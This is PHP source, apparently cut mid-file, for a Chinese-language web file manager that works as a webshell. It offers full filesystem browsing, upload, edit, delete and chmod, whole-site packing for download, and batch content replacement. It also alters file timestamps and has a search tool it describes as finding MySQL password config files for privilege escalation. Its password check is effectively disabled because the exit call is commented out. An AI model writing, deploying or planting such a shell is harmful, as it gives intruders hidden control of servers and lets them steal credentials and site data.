<style type="text/css">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}.C{background-color:#000000;border:0px}.cmd{background-color:#000;color:#FFF}body{margin: 0px;margin-left:4px;}BODY {SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}.am{color:#888;font-size:11px;}
</style>
<body style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)" scroll=no><center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='' target='_blank'><font color=#3399FF>PHP程序文件管理系统</font></a><br><br>

<form method='post'>输入密码：<input name='mypass' type='password' size='22'> <input type='submit' value='登陆'><br><br><br><br></div></center></body>
</html>
end;
    html_n($str);
}

function Mysql_shellcode()
{
    return false;
}

if (@get_magic_quotes_gpc()) {
    foreach ($_POST as $k => $v) {
        if (!is_array($_POST[$k])) {
            $_POST[$k] = stripslashes($v);
        } else {
            $array = $_POST[$k];
            foreach ($array as $kk => $vv) {
                $array[$kk] = stripslashes($vv);
            }
            $_POST[$k] = $array;
        }
    }
    foreach ($_GET as $k => $v) {
        if (!is_array($_GET[$k])) {
            $_GET[$k] = stripslashes($v);
        } else {
            $array = $_GET[$k];
            foreach ($array as $kk => $vv) {
                $array[$kk] = stripslashes($vv);
            }
            $_GET[$k] = $array;
        }
    }
}
if (!isset($_GET["img"])) {
    header("Content-Type: text/html;charset=utf-8");
}


 
 
$envlpath = md5($_SERVER ['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);

//setcookie($envlpath, md5(mypass), time() + 6 * 3600);

if (!isset($_COOKIE[$envlpath]) || $_COOKIE[$envlpath] != md5(mypass)) {
    if (isset($_POST['mypass'])) {
        if ($_POST['mypass'] == mypass) {
            setcookie($envlpath, md5(mypass), time() + 6 * 3600);

            echo "<meta http-equiv='refresh' content='0'>";
            die;
        } else {
            echo '<CENTER>密码错误</CENTER>';
        }
    }
    //islogin();
    //exit;
}



if (isset($_GET['down'])) do_down($_GET['down']);
if (isset($_GET['pack'])) {
    $dir = do_show($_GET['pack']);
    $zip = new eanver($dir);
    $out = $zip->out;
    do_download($out, $_SERVER['HTTP_HOST'] . ".tar.gz");
}
if (isset($_GET['unzip'])) {
    css_main();
    start_unzip($_GET['tt'], $_GET['unzip'], $_GET['unzip'], $_GET['todir']);
    exit;
}
define('root_dir', str_replace('\\', '/', dirname(myaddress)) . '/');
define('run_win', substr(PHP_OS, 0, 3) == "WIN");
//define('my_shell', str_path(root_dir . $_SERVER['SCRIPT_NAME']));
define('my_shell', str_replace('\\', '/', myaddress));

$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if ($img) css_img($img);
if ($eanver == "phpinfo") die(phpinfo());
if ($eanver == 'logout') {
    setcookie($envlpath, "", time() - 6 * 3600);
    setcookie('iframeurl', "", time() - 6 * 3600); 
    refresh_page();
    die();
}
$class = array("信息操作" => array("upfiles" => "上传文件", "phpinfo" => "基本信息"),  "批量操作" => array("tihuan" => "批量替换内容", "scanfile" => "批量搜索文件", "scanphp" => "批量查找木马"));
$msg = array("0" => "保存成功", "1" => "保存失败", "2" => "上传成功", "3" => "上传失败", "4" => "修改成功", "5" => "修改失败", "6" => "删除成功", "7" => "删除失败");


css_main();

switch ($eanver) {
    case "left":
 
        css_left();

        $str = <<<end
<dl><dt><a href="#" onclick="showHide('items1');" target="_self">
end;

        html_n($str);
        html_img("title");
        html_n(' 本地硬盘</a></dt><dd id="items1" style="display:block;"><ul>');
        $ROOT_DIR = File_Mode();
        html_n("<li class='link'  onClick=\"show_hover(this,'link')\" ><a title='" . $ROOT_DIR . "' href='?eanver=main&path=" . $ROOT_DIR . "' target='main'>网站根目录</a></li><li class='link'  onClick=\"show_hover(this,'link')\"   ><a  href='?eanver=main' target='main'>本程序目录</a></li>");
        for ($i = 66; $i <= 90; $i++) {
            $drive = chr($i) . ':';
            if (is_dir($drive . "/")) {
                $vol = File_Str("vol $drive");
                if (empty($vol)) $vol = $drive;
                html_n("<li class='link'  onClick=\"show_hover(this,'link')\" ><a  title='" . $drive . "' href='?eanver=main&path=" . $drive . "' target='main'>本地磁盘(" . $drive . ")</a></li>");
            }
        }
        html_n("</ul></dd></dl>");
        $i = 2;
        foreach ($class as $name => $array) {
            html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items" . $i . "');\" target=\"_self\">");
            html_img("title");
            html_n($name . '</a></dt><dd id="items' . $i . '" style="display:block;"><ul>');
            foreach ($array as $url => $value) {
                html_n('<li class="link" onClick="show_hover(this,\'link\')" ><a   href="?eanver=' . $url . "\" target='main'>" . $value . "</a></li>");
            }
            html_n("</ul></dd></dl>");
            $i++;
        }
        html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items" . $i . "');\" target=\"_self\">");
       // html_img("title");
       // html_n(' 其它操作</a></dt><dd id="items' . $i . "\" style=\"display:block;\"><ul><li><a title='安全退出' href='?eanver=logout' target=\"main\">安全退出</a></li></ul></dd></dl></div>");

        break;
    case "main":
        
       
        css_js("1");
        $dir = @dir($path);
        $REAL_DIR = File_Str(realpath($path));
        if (!empty($_POST['actall'])) {
            echo '<div class="actall">' . File_Act($_POST['files'], $_POST['actall'], $_POST['inver']) . '</div>';
        }
        if (!empty($_POST['attam'])) {
            $file = $_GET['path'] . '/' . $_POST['file'];
            switch ($_POST['attam']) {
                case "c" :
                    if (!preg_match("/^[0-7]{4}$/", $_POST['inver'])) $msg = '<p style="color:#DC143C;">属性值错误</p>';
                    $newmode = base_convert($_POST['inver'], 8, 10);
                    @chmod($file, $newmode);
                    $msg = '<p style="color:#40E0D0;">' . $file . ' 属性修改为：' . $_POST['inver'] . '</p>';
                    break;
                case "d" :
                    if (!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/', $_POST['inver'])) {
                        $msg = '<p style="color:#DC143C;">' . $_POST['inver'] . '时间格式错误,格式为：' . date("Y-m-d H:i:s") . '</p>';
                    } else {
                        @touch($file, strtotime($_POST['inver']));
                        $msg = '<p style="color:#40E0D0;">' . $file . ' 修改时间为：' . $_POST['inver'] . '</p>';
                    }
                    break;
            }
            echo '<div class="actall" align="center">' . $msg . '</div>';
        }
        $NUM_D = $NUM_F = 0;
        if (!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://' . $_SERVER['SERVER_NAME'] . '/';
        $ROOT_DIR = File_Mode();
        html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>地址:<input type='hidden' name='eanver' value='main'><input type='text' size='80' name='path' value='" . $path . "'> <input type='submit' value='转到'> </form><br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=" . urlencode($path) . "'><input type=\"button\" value=\"新建文件\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=" . urlencode($path) . "&refile=1&name=');\"> <input type=\"button\" value=\"新建目录\" onclick=\"rusurechk('newdir','?eanver=editr&p=" . urlencode($path) . "&redir=1&name=');\">");
        html_input("file", "upfilet", "", "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
        html_input("submit", "uploadt", "上传");
        if (!empty($_POST['newfile'])) {
            if (isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
            $newfile = $_POST['newfile'];
            $txt = $_POST['txt'];

            if (substr(PHP_VERSION, 0, 1) >= 5) {
                if ((strtolower($_POST['charset']) == 'gb2312') or (strtolower($_POST['charset']) == 'gbk')) {
                    $txt = iconv("UTF-8", "gb2312//IGNORE", $_POST['txt']);
                } else {
                    $txt = array_iconv($txt);
                }
            }

            //文件名转义gbk来操作

            $newfile = iconv("UTF-8", "gb2312//IGNORE", $newfile);
            echo do_write($newfile, $bin, $txt) ? '<br>' . $newfile . ' ' . $msg[0] : '<br>' . $newfile . ' ' . $msg[1];
            @touch($newfile, @strtotime($_POST['time']));
        }
        html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path=' . $path . '"><table width="100%"  class="tablecontent"  border=0 bgcolor="#555555"><tr height="25"><td width="45%"><b>');
        html_a('?eanver=main&path=' . uppath($path), "<b>上级目录</b>");
        html_n('</b></td><td align="center" width="10%"><b>操作</b></td><td align="center" width="5%"><b>文件属性</b></td><td align="center" width="8%"><b>(' . get_current_user() . ')用户|组</b></td><td align="center" width="10%"><b>修改时间</b></td><td align="center" width="10%"><b>文件大小</b></td></tr>');
        while ($dirs = @$dir->read()) {
            if ($dirs == '.' or $dirs == '..') continue;
            $dirpath = str_path("$path/$dirs");
            if (is_dir($dirpath)) {
                $perm = substr(base_convert(fileperms($dirpath), 10, 8), -4);
                $filetime = @date('Y-m-d H:i:s', @filemtime($dirpath));
                $dirpath = urlencode($dirpath);
                html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="' . $dirs . '">');
                html_img("dir");
                html_a('?eanver=main&path=' . $dirpath, $dirs);
                $dirs = characet($dirs);
                html_n('</td><td align="center"><a href="#" onClick="rusurechk(\'' . $dirs . "','?eanver=rename&p=" . $dirpath . "&newname=');return false;\">改名</a> <a href=\"#\" onClick=\"rusuredel('" . $dirs . "','?eanver=deltree&p=" . $dirpath . "');return false;\">删除</a>");
                html_a('?pack=' . $dirpath, "打包");
                html_n("</td><td align=\"center\"><a href=\"javascript:SubmitAttran('修改所选文件属性为:','" . $dirs . "','" . $perm . "','c');\"  title='修改属性'>" . $perm . '</a></td><td align="center">' . GetFileOwner("$path/$dirs") . ":" . GetFileGroup("$path/$dirs"));
                html_n("</td><td align='center'><a href=\"javascript:SubmitAttran('修改所选文件时间为:','" . $dirs . "','" . $filetime . "','d');\"  title='修改时间'>" . $filetime . "</a></td><td align='right'></td></tr>");
                $NUM_D++;
            }
        }
        @$dir->rewind();
        while ($files = @$dir->read()) {
            if ($files == '.' or $files == '..') continue;
            $filepath = str_path("$path/$files");
            if (!is_dir($filepath)) {
                $fsize = @filesize($filepath);
                $fsize = @File_Size(sprintf("%u", $fsize));
                $perm = substr(base_convert(fileperms($filepath), 10, 8), -4);
                $filetime = @date('Y-m-d H:i:s', @filemtime($filepath));
                $Fileurls = str_replace(File_Str($ROOT_DIR . '/'), $GETURL, $filepath);
                $todir = $ROOT_DIR . '/';
                $filepath = urlencode($filepath);
                $it = substr($filepath, -3);
                html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="' . $files . '">');
                html_img(css_showimg($files));
                html_a($Fileurls, $files, 'target="_blank"');
                html_n('</td><td align="center">');
                if (($it == '.gz') or ($it == 'zip') or ($it == 'tar') or ($it == '.7z')) {
                    html_a("?type=1&unzip=" . $filepath, "Z解1", 'title="手写的PHP解压' . $files . "\" onClick=\"rusurechk('" . $todir . "','?tt=1&unzip=" . $filepath . '&todir=\');return false;"');
                    html_a("?type=2&unzip=" . $filepath, "Z解2", 'title="PHP自带的ZIP解压' . $files . "\" onClick=\"rusurechk('" . $todir . "','?tt=2&unzip=" . $filepath . '&todir=\');return false;"');
                    html_a("?type=3&unzip=" . $filepath, "T解", 'title="PHP自带的tar解压' . $files . ',针对LINUX文件属性权限用,比如0777,0755" onClick="rusurechk(\'' . $todir . "','?tt=3&unzip=" . $filepath . '&todir=\');return false;"');
                } else {
                    html_a("?eanver=editr&p=" . $filepath, "编辑", "title=\"" . $files . '"');
                }

                $files = characet($files);
                html_n("<a href=\"#\" onClick=\"rusurechk('" . $files . "','?eanver=rename&p=" . $filepath . "&newname=');return false;\">改名</a> <a href=\"#\" onClick=\"rusuredel('" . $files . "','?eanver=del&p=" . $filepath . "');return false;\">删除</a> <a href=\"#\" onClick=\"rusurechk('" . urldecode($filepath) . "','?eanver=copy&p=" . $filepath . "&newcopy=');return false;\">复制</a></td><td align=\"center\"><a href=\"javascript:SubmitAttran('修改所选文件属性为:','" . $files . "','" . $perm . "','c');\"  title='修改属性'>" . $perm . "</a></td><td align=\"center\">" . GetFileOwner("$path/$files") . ':' . GetFileGroup("$path/$files"));
                html_n("</td><td align='center'><a href=\"javascript:SubmitAttran('修改所选文件时间为:','" . $files . "','" . $filetime . "','d');\"  title='修改时间'>" . $filetime . "</a></td><td align='right'>");
                html_a("?down=" . $filepath, $fsize, "title=\"下载" . $files . '"');
                html_n("</td></tr>");
                $NUM_F++;
            }
        }
        @$dir->close();
        $Filetime = gmdate('Y-m-d H:i:s', time() + 3600 * 8);
        html_n("</table>
<div class=\"actall\"> <input type=\"hidden\" id=\"actall\" name=\"actall\" value=\"\">
<input type=\"hidden\" id=\"attam\" name=\"attam\" value=\"\">
<input type=\"hidden\" id=\"inver\" name=\"inver\" value=\"undefined\">
<input type=\"hidden\" id=\"file\" name=\"file\" value=\"undefined\">
<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form);\">
<input type=\"button\" value=\"复制\" onclick=\"SubmitUrl('复制所选文件到路径: ','" . $REAL_DIR . "','a');return false;\">
<input type=\"button\" value=\"删除\" onclick=\"Delok('所选文件','b');return false;\">
<input type=\"button\" value=\"属性\" onclick=\"SubmitUrl('修改所选文件属性值为: ','0666','c');return false;\">
<input type=\"button\" value=\"时间\" onclick=\"CheckDate('" . $Filetime . "','d');return false;\">
<input type=\"button\" value=\"打包\" onclick=\"SubmitUrl('打包并下载所选文件下载名为: ','" . $path . '/' . $_SERVER['SERVER_NAME'] . ".tar.gz','e');return false;\">
目录(" . $NUM_D . ") / 文件(" . $NUM_F . ")</div>
</form> ");
        break;
    case "editr":
        echo("<script>");
        html_base();
        echo("</script>");
        css_js("2");
        if (!empty($_POST['uploadt'])) {
            echo @copy($_FILES['upfilet']['tmp_name'], str_path($p . '/' . $_FILES['upfilet']['name'])) ? html_a("?eanver=main", $_FILES['upfilet']['name'] . ' ' . $msg[2]) : msg($msg[3]);
            die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . urlencode($p) . '">');
        }
        if (!empty($_GET['redir'])) {
            $name = $_GET['name'];
            $newdir = str_path($p . '/' . $name);
            @mkdir($newdir, 0777) ? html_a("?eanver=main", $name . ' ' . $msg[0]) : msg($msg[1]);
            die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . urlencode($p) . '">');
        }
        if (!empty($_GET['refile'])) {
            $name = $_GET['name'];
            $jspath = urlencode($p . '/' . $name);
            $pp = urlencode($p);
            $p = str_path($p . '/' . $name);
            $FILE_CODE = "";
            $charset = 'UTF-8';//'GB2312';
            $FILE_TIME = date('Y-m-d H:i:s', time() + 3600 * 24*365);
            if (@file_exists($p)) echo "发现目录下有\"同名\"文件,更换编码可以截入<br>";
        } else {
            $jspath = urlencode($p);
            //文件修改时间使用当前时间 废弃原文件时间
            $FILE_TIME = date('Y-m-d H:i:s');//date('Y-m-d H:i:s', filemtime($p));
            //$FILE_CODE = implode('', @file($p));

            $FILE_CODE = file_get_contents($p);
            //转换utf8
            $p = characet($p);

            if (substr(PHP_VERSION, 0, 1) >= 5) {
                if (empty($_GET['charset'])) {
                    if (mb_is_utf8($FILE_CODE)) {
                        $charset = 'UTF-8'; //已经是utf8的则输出utf8 无需处理  因为现有系统是utf8
                        //  $FILE_CODE = iconv("UTF-8", "gb2312//IGNORE", $FILE_CODE);
                    } else {
                        $charset = 'GB2312'; //默认gb2312 需要转成 utf8 来展示
                        $FILE_CODE = iconv($charset, "UTF-8//IGNORE", $FILE_CODE);
                        // $FILE_CODE = mb_convert_encoding($FILE_CODE, "UTF-8","GB2312");

                    }
                } else {
                    $charset = $_GET['charset'];
                    $FILE_CODE = iconv($_GET['charset'], "UTF-8//IGNORE", $FILE_CODE);
                }
            }

            $FILE_CODE2 = $FILE_CODE;
            $FILE_CODE = htmlspecialchars($FILE_CODE);
            if ($FILE_CODE == "") {
                $FILE_CODE = htmlspecialchars($FILE_CODE2, ENT_COMPAT, 'ISO-8859-1');
            }
        }
        html_n("<div class=\"actall\"  style=\"display:none;\" >查找内容: <input name=\"searchs\" type=\"text\" value=\"\" style=\"width:500px;\">
<input type=\"button\" value=\"查找\" onclick=\"search(searchs.value)\"></div>
<form method='POST'  id=\"form_editor\"  action='?eanver=main&path=" . $pp . "'>
<div class=\"actall\"  style=\"border:none; padding:0; margin:0;\" >
<input type=\"text\" name=\"newfile\"  id=\"newfile\" value=\"" . $p . "\" style=\"width:750px;\">指定编码：<input name=\"charset\" id=\"charset\" value=\"" . $charset . "\" Type=\"text\" style=\"width:80px;\" onkeydown=\"if(event.keyCode==13)window.location='?eanver=editr&p=" . $jspath . "&charset='+this.value;\">
<input type=\"button\" value=\"选择\" onclick=\"window.location='?eanver=editr&p=" . $jspath . "&charset='+this.form.charset.value;\" style=\"width:50px;\">");
        html_select(array("GB2312" => "GB2312", "UTF-8" => "UTF-8", "BIG5" => "BIG5", "EUC-KR" => "EUC-KR", "EUC-JP" => "EUC-JP", "SHIFT-JIS" => "SHIFT-JIS", "WINDOWS-874" => "WINDOWS-874", "ISO-8859-1" => "ISO-8859-1"), $charset, "onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
        html_n("</div>
<div class=\"actall\"> <textarea name=\"txt\" id=\"form_txt\" style=\"width:100%;min-height:600px;\">" . $FILE_CODE . "</textarea></div>
<div class=\"actall\" style='display:none;'>文件修改时间 <input type=\"text\" name=\"time\" id=\"mtime\" value=\"" . $FILE_TIME . "\" style=\"width:150px;\"> 
<input type=\"checkbox\" name=\"bin\" value=\"wb+\" size=\"\" checked>以二进制形式保存文件(建议使用)</div>
<div class=\"actall\" style='padding-left:60px;text-align: center; background:#fefefe; height:60px; line-height: 60px; '>
<input type=\"button\" class=\"layui-btn layui-btn-normal\"  value=\"保存\" onclick=\"CheckDate();\" style=\"width:180px; margin-top:10px\">
<input name='reset' type='reset' class=\"layui-btn layui-btn-normal\"  style='display: none;' value='重置'>
<input type=\"button\" value=\"关闭\"  onclick=\"close_edit();\"   class=\"layui-btn layui-btn-normal\"  t_onclick=\"window.location='?eanver=main&path=" . $pp . "';\" style=\"width:80px; \"></div>
</form>
");
        break;
    case "rename":
        html_n("<tr><td>");
        $newname = urldecode($pp) . '/' . urlencode($_GET['newname']);
        @rename($p, $newname) ? html_a("?eanver=main&path=$pp", urlencode($_GET['newname']) . ' ' . $msg[4]) : msg($msg[5]);
        die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . $pp . '">');
        break;
    case "deltree":
        html_n("<tr><td>");
        delDirAndFile($p);
        !is_dir($p) ? html_a("?eanver=main&path=$pp", $p . ' ' . $msg[6]) : msg($msg[7]);
        die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . $pp . '">');
        break;
    case "del":
        html_n("<tr><td>");
        delDirAndFile($p);
        !is_file($p) ? html_a("?eanver=main&path=$pp", $p . ' ' . $msg[6]) : msg($msg[7]);
        die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . $pp . '">');
        break;
    case "copy":
        html_n("<tr><td>");
        $newpath = explode('/', $_GET['newcopy']);
        $pathr[0] = $newpath[0];
        for ($i = 1; $i < count($newpath); $i++) {
            $pathr[] = urlencode($newpath[$i]);
        }
        $newcopy = implode('/', $pathr);
        @copy($p, $newcopy) ? html_a("?eanver=main&path=$pp", $newcopy . ' ' . $msg[4]) : msg($msg[5]);
        die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . $pp . '">');
        break;
    case "perm":
        html_n("<form method='POST'><tr><td>" . $p . " 属性为: ");
        if (is_dir($p)) {
            html_select(array("0777" => "0777", "0755" => "0755", "0555" => "0555"), $_GET['chmod']);
        } else {
            html_select(array("0666" => "0666", "0644" => "0644", "0444" => "0444"), $_GET['chmod']);
        }
        html_input("submit", "save", "修改");
        back();
        if ($_POST['class']) {
            switch ($_POST['class']) {
                case "0777":
                    $change = @chmod($p, 0777);
                    break;
                case "0755":
                    $change = @chmod($p, 0755);
                    break;
                case "0555":
                    $change = @chmod($p, 0555);
                    break;
                case "0666":
                    $change = @chmod($p, 0666);
                    break;
                case "0644":
                    $change = @chmod($p, 0644);
                    break;
                case "0444":
                    $change = @chmod($p, 0444);
                    break;
            }
            $change ? html_a("?eanver=main&path=$pp", $msg[4]) : msg($msg[5]);
            die("<meta http-equiv=\"refresh\" content=\"1;URL=?eanver=main&path=" . $pp . '">');
        }
        html_n("</td></tr></form>");
        break;


    case "upfiles":
        html_n("<tr><td>服务器限制上传单个文件大小: " . @get_cfg_var('upload_max_filesize') . "<form method=\"POST\" enctype=\"multipart/form-data\">");
        html_input("text", "uppath", root_dir, "<br>上传到路径: ", "51");
        html_n("<SCRIPT language=\"JavaScript\">
function addTank(){
var k=0;
  k=k+1;
  k=tank.rows.length;
  newRow=document.all.tank.insertRow(-1)
  newcell=newRow.insertCell()
  newcell.innerHTML=\"<input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'>\"
}

function delTank() {
  if(tank.rows.length==1) return;
  var checkit = false;
  for (var i=0;i<document.all.tankNo.length;i++) {
    if (document.all.tankNo[i].checked) {
      checkit=true;
      tank.deleteRow(i+1);
      i--;
    }
  }
  if (checkit) {
  } else{
    alert(\"请选择一个要删除的对象\");
    return false;
  }
}
</SCRIPT>
<br><br>
<table cellSpacing=0 cellPadding=0 width=\"100%\" border=0>
          <tr>
            <td width=\"7%\"><input class=\"button01\" type=\"button\"  onclick=\"addTank()\" value=\" 添 加 \" name=\"button2\"/>
            <input name=\"button3\"  type=\"button\" class=\"button01\" onClick=\"delTank()\" value=\"删除\" />
            </td>
          </tr>
</table>
<table  id=\"tank\" width=\"100%\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" >
<tr><td>请选择要上传的文件：</td></tr>
<tr><td><input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'></td></tr>
</table>");
        html_n("<br><input type=\"submit\" name=\"upfiles\" value=\"上传\" style=\"width:80px;\"> <input type=\"button\" value=\"返回\" onclick=\"window.location='?eanver=main&path=" . root_dir . "';\" style=\"width:80px;\">");
        if (isset($_POST['upfiles'])) {
            foreach ($_FILES["upfile"]["error"] as $key => $error) {
                if ($error == UPLOAD_ERR_OK) {
                    $tmp_name = $_FILES["upfile"]["tmp_name"][$key];
                    $name = $_FILES["upfile"]["name"][$key];
                    $uploadfile = str_path($_POST['uppath'] . '/' . $name);
                    $upload = @copy($tmp_name, $uploadfile) ? $name . $msg[2] : @move_uploaded_file($tmp_name, $uploadfile) ? $name . $msg[2] : $name . $msg[3];
                    echo "<br><br>" . $upload;
                }
            }
        }
        html_n("</form>");
        break;

    case "tihuan":

        css_js("1");
        $newcode = isset($_POST['newcode']) ? $_POST['newcode'] : "";
        $oldcode = isset($_POST['oldcode']) ? $_POST['oldcode'] : "";

        $patht = isset($_GET['path']) ? $_GET['path'] : root_dir;

        html_n("<tr><td  valign='top'   >此功能可批量替换文件内容,请小心使用.<br><br> <div><form method=\"POST\">");
        html_input("text", "path", $patht, "路径范围", "145");
        html_input("checkbox", "pass", "", "使用目录遍历", "", false);
        html_text("newcode", "67", "5", $newcode);
        html_n("<br><br>替换为");
        html_text("oldcode", "67", "5", $oldcode);
        html_n(" <br/><br/> <p style='float:left; clear:both;' > ");
        html_input("submit", "passreturn", "替换", "<br><br></div>");

        html_n("</p> ");
        //var_dump(root_dir);

        html_n("  <p style='float:left; clear:both;' > </p> ");
        html_n("</td><td width='300' valign='top'  >");

        showdir($patht, 'tihuan');

        html_n("</td></tr></form>");

        if (!empty($_POST['path'])) {
            html_n("<tr><td>目标文件:<br><br>");
            if (isset($_POST['pass'])) $bool = true; else $bool = false;
            do_passreturn($_POST['path'], $_POST['newcode'], "tihuan", $bool, $_POST['oldcode']);
        }
        break;
    case "scanfile":
        $code = isset($_POST['code']) ? $_POST['code'] : "";
        css_js("4");
        css_js("1");
        html_n("<tr><td>此功能可很方便的搜索到保存MYSQL用户密码的配置文件,用于提权.<br>当服务器文件太多时,会影响执行速度,不建议使用目录遍历.<form method=\"POST\" name=\"sform\"><br>");
        html_input("text", "path", root_dir, "路径名", "45");
        html_input("checkbox", "pass", "", "使用目录遍历", "", true);
        html_input("text", "code", $code, "<br><br>关键字", "40");
        html_select(array("--MYSQL配置文件--", "Discuz", "PHPWind", "phpcms", "dedecms", "PHPBB", "wordpress", "sa-blog", "o-blog", "dedecms", "phpcms"), 0, "onchange='return Fulll(options[selectedIndex].value)'");
        html_n("<br><br>");
        html_radio("搜索文件名", "搜索包含文字", "scanfile", "scancode");
        html_input("submit", "passreturn", "搜索");
        html_n("</td></tr></form>");
        if (!empty($_POST['path'])) {
            html_n("<tr><td>找到文件:<br><br>");
            if (isset($_POST['pass'])) $bool = true; else $bool = false;
            do_passreturn($_POST['path'], $_POST['code'], $_POST['return'], $bool);
        }
        break;
    case "scanphp":
        css_js("1");
        $patht = isset($_GET['path']) ? $_GET['path'] : root_dir;

        html_n("<tr><td  valign='top'  >原理是根据特征码定义的,请查看代码判断后再进行删除.<form method=\"POST\"> (文件较多时建议分目录查找)<br>");
        html_input("text", "path", $patht, "查找范围", "120");
        html_input("checkbox", "pass", "", "使用目录遍历<br><br>脚本类型", "", true);
        html_select(array("php" => "PHP", "asp" => "ASP","asa" => "ASA","cer" => "CER","htr" => "HTR",
        "cdx" => "CDX", "aspx" => "ASPX", "jsp" => "JSP"), $_POST['class']);

        echo "开启选中类型文件全部检查? <input type='checkbox' name='checkalltype' value='1' />";

        html_input("submit", "passreturn", "查找", "<br><br>");

        html_n("</td><td>");

        showdir($patht, 'scanphp');

        html_n("</td></tr></form>");
        if (!empty($_POST['path'])) {
            html_n("<tr><td>找到文件:<br><br>");
            if (isset($_POST['pass'])) $bool = true; else $bool = false;
            do_passreturn($_POST['path'], $_POST['class'], "scanphp", $bool);
        }
        break;
 

    default:
         
        html_main();
        break;
}


if ($_GET['eanver'] == "scanphp") {
    $t_end = microtime(true);
    //var_dump($t_start);
    //var_dump($t_end);
    echo "<p style='position:absolute;top:50px; right:10px; border:5px solid red; color:red; background:#fff;'>" .
        (round($t_end, 2) - round($t_start, 2)) . "秒</p>";
}
//执行底部文件
css_foot();



ob_end_flush();

?>